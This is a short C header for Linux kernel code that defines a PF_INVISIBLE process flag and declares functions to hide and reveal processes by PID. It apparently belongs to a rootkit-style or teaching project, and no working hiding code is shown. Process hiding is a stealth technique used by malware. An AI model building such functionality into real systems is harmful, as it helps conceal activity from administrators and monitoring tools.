#include <linux/unistd.h>
#include <linux/sched.h>
#include <linux/types.h>

#include <linux/syscalls.h>

#define EBADPID -1
#define ENOPROC -2
#define PF_INVISIBLE 0x00010000 //PF__HOLE__00010000

static inline pid_t str_to_pid(char *str) {
    return simple_strtoul(str, NULL, 10);
}
/*
struct hidden_pid_node{
    pid_t pid;
    struct list_head list;
};
extern struct list_head hidden_pid_list; */
int is_pid_invisible(pid_t pid);
void hide_full_process(int pid);
void show_full_process(int pid);